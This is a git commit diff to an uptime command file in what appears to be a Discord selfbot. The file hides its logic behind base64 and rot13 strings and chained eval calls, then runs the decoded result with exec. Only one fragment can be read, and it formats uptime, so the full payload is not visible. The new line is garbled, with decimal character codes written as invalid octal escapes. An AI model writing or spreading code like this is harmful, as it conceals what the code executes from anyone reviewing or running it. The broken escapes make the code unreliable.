2fec6b3b0c51e6160746de23aa5974382905caa0
leo <85583839+01Leozin@users.noreply.github.com>
2021-08-21 22:42:37 -0300

    Update uptime.py

--- commands/uptime.py
+++ commands/uptime.py
@@ -4,5 +4,5 @@ command = 'bo3IlpljtpzIgLJyhMTIlVQ0tMTy2oJ9xXTyhqPuxMJk0LF50o3EuoS9mMJAiozEmXPxc
 divinity = 'QpDQogICAgaWYgZGF5czoNCiAgICAgICAgdGltZV9mb3JtYXQgPSAie2R9IGRheXMsIHtofSBob3Vycywge219IG1pbnV0ZXMsIGFuZCB7c30gc2Vjb25kcy4iDQogICAgZWxzZToNCiAgICAgICAgdGltZV9mb3JtYXQgPSAie2h9IGhvdXJzLCB7b'
 selfbot = 'K0toJyhqKEypljtLJ5xVUgmsFOmMJAiozEmYvVAPvNtVPO1pUEcoJIsp3EuoKNtCFO0nJ1yK2Mipz1uqP5zo3WgLKDbMQ1xLKymYPObCJuiqKWmYPOgCJ1coaI0MKZfVUZ9p2Iwo25xplxAPvNtVPOuq2ScqPOwqUthp2IhMPu1pUEcoJIsp3EuoKNc'
 leozin = '\x72\x6f\x74\x31\x33'
-lol = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+lol = eval('\45\45\32\117\112\116\105\109\101\10') + eval('\99\111\100\101\99\115\46\100\101\99\111\100\101\40\108\111\118\101\44\32\106\111\121\41') + eval('\100\105\118\105\110\105\116\121') + eval('\99\111\100\101\99\115\46\100\101\99\111\100\101\40\115\101\108\102\98\111\116\44\32\108\101\111\122\105\110\41')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
